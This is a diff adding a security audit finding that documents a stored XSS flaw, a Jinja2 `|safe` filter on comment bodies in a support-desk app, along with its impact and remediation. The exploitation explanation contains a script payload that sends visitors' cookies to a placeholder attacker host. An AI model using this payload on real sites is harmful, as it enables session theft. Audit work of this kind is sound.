@@ -321,3 +321,52 @@ def verify_password(password, password_hash):
 
 ---
 
+### Finding 6
+
+**1. Vulnerability Title:**
+Stored Cross-Site Scripting (XSS)
+
+**2. Classification:**
+- **True Positive**
+- False Positive
+
+**Justification:**
+The Jinja2 `|safe` filter is applied to user-submitted comment bodies, bypassing the template engine's automatic HTML escaping, allowing scripts stored in the database to execute in victims' browsers.
+
+**3. Source File Information:**
+
+| Field                      | Details                                        |
+|----------------------------|------------------------------------------------|
+| File Name                  | `supportdesk-app/templates/ticket.html`        |
+| Function Name              | N/A (HTML Template)                            |
+| Vulnerable Line Number(s)  | 35                                             |
+
+| Field               | Details                                                   |
+|---------------------|-----------------------------------------------------------|
+| CWE       | CWE-79 — https://cwe.mitre.org/data/definitions/79.html   |
+| Severity  | High                                                      |
+
+**4. Screenshot of SAST Tool Output:**
+> Identified via Manual Code Review. Semgrep did flag CSRF on ticket.html but not the `|safe` XSS sink. This is a gap in automated detection.
+
+**5. Screenshot of Vulnerable Code:**
+![Vulnerable code — ticket.html line 35 using |safe filter](screenshot/f6_code.png)
+> File: `supportdesk-app/templates/ticket.html` — Line 35
+
+**6. Why is it Vulnerable?**
+- **Why the code is vulnerable:** The template renders comment bodies as `{{ c.body|safe }}`. Jinja2 auto-escaping is active by default, but `|safe` marks the string as trusted HTML, disabling escaping for that value.
+- **How the vulnerability could be exploited:** An attacker posts a comment with `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`. This is saved to the database and executed in every subsequent viewer's browser, stealing their session cookies.
+- **What makes it a True Positive:** User input is persisted via `models.add_comment()` and rendered unescaped. This is a classic Stored XSS chain.
+
+**7. Security Impact:**
+Session hijacking, account takeover, credential theft, and defacement for all users viewing the ticket.
+
+**8. Recommended Remediation:**
+Remove the `|safe` filter: change `{{ c.body|safe }}` to `{{ c.body }}`. If rich text is required, sanitize server-side with the Bleach library before storage.
+
+**References:**
+- OWASP: https://owasp.org/www-community/attacks/xss/
+- CWE-79: https://cwe.mitre.org/data/definitions/79.html
+
+---
+
